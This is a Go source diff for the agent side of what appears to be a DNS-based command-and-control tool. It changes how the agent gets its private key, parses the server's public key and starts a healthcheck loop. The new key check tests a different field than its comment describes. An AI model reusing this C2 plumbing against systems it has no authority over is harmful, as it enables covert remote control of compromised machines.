@@ -201,27 +201,38 @@ func sendHealthCheck() error {
 func RunAgent(cmd *cobra.Command, args []string) error {
 	log.SetLevel(log.Level(conf.GlobalAgentConfig.LogLevel))
 	log.Infof("Starting agent...")
-	// set global flag that we're running as server
+	// set global flag that we're running as Agent
 	conf.Mode = conf.RunAsAgent
+
 	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
 	AgentStatus.HealthCheckInterval = 10 * time.Second
 	AgentStatus.NextMessageType = c2.MessageHealthcheck
 	AgentStatus.MessageTicker = time.NewTicker(AgentStatus.HealthCheckInterval)
 
-	// dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
-	// errorHandler(err)
 	if !strings.HasSuffix(conf.GlobalAgentConfig.DnsSuffix, ".") {
 		conf.GlobalAgentConfig.DnsSuffix = conf.GlobalAgentConfig.DnsSuffix + "."
 	}
 	if !strings.HasPrefix(conf.GlobalAgentConfig.DnsSuffix, ".") {
 		conf.GlobalAgentConfig.DnsSuffix = "." + conf.GlobalAgentConfig.DnsSuffix
 	}
+
 	var err error
-	conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyB32)
-	errorHandler(err)
+	// generate a new private key if the user hasn't provided one
+	if conf.GlobalAgentConfig.PrivateKey == nil {
+		conf.GlobalAgentConfig.PrivateKey, err = cryptography.GenerateKey()
+		errorHandler(err)
+	} else {
+		conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyB32)
+		errorHandler(err)
+	}
+
+	// extract the public key from the provided Base32 encoded string
 	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyB32)
 	errorHandler(err)
+
+	// start the agent by sending a healthcheck
 	sendHealthCheck()
+
 	for {
 		select {
 		case <-exiting:
